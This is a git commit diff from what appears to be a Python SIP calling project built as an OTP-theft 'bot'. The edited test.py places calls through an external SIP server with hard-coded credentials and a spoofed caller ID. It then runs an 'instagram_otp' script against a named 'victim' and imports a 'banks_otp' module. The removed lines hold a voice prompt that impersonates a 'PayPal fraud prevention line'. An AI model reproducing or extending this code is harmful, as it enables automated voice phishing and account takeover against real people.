4830f4c085f7b6f4e385e1bd4e05a9d34d4f67c7
moha-abdi <mohaa6052@gmail.com>
2024-04-05 12:02:01 +0300

    Add new scripts for testing

---
+++ scripts/__init__.py
@@ -0,0 +1,4 @@
+
+class OTPScript:
+    def __init__(self) -> None:
+        pass
--- test.py
+++ test.py
@@ -1,29 +1,28 @@
-
-
 import asyncio
 from PySIP.sip_account import SipAccount
+from scripts.banks_otp import bank_script
+from scripts.instagram_otp import instagram_script
 
-account = SipAccount('3001', '30013001', '192.168.1.112:5060')
+# account = SipAccount('3001', '30013001', '192.168.1.112:5060')
+account = SipAccount('michel2', 'pass1234', '109.207.170.23:5060', connection_type='UDP', caller_id='18006669320')
 
-call = account.make_call('111')
-print(call)
+# call = account.make_call('12045148765')
+# print(call)
 
 
 async def main():
-    # await account.register()
+    await account.register()
     
-    # call = account.make_call('111')
+    call = account.make_call('12045148765')
     call_task = asyncio.create_task(call.start())
 
-    try:
-        await call.call_handler.say("Welcome to PayPal fraud prevention line")
-        await call.call_handler.say("We have recently received an online purchase request if this was not you presee 1")
-        dtmf_key = await call.call_handler.gather()
-        print(dtmf_key)
-    except RuntimeError:
-        print("Call is no longer running")
+    await instagram_script(
+        call.call_handler,
+        victim_name="John"
+    )
 
     await call_task
+    await account.unregister()
 
 
 if __name__ == "__main__":
